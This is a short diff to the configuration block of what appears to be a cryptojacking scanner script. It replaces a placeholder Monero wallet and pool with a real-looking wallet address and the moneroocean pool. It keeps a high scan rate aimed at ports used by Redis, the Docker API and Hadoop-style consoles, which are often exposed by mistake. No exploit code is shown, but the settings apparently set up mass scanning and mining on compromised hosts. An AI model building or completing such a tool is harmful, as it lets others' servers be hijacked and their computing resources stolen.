@@ -5,8 +5,8 @@
 # =============================================================================
 
 # ------------------------------- CONFIGURATION --------------------------------
-WALLET="43zXKZxJZx...IL_TUO_WALLET"
-POOL="pool.supportxmr.com:3333"
+WALLET="46PY3me35srRYMUScA3r7uhNJorsH95Sg4rkCqYhKm7tFh94w5nSEnp91S7ZmLwFGJS9UrHN4BCxL7CcPDjGUj8cVFbgHkt"
+POOL="moneroocean.stream:10128"
 PASSWORD="x"
 RATE=5000
 SCAN_PORTS="6379,2375,8080,8088"
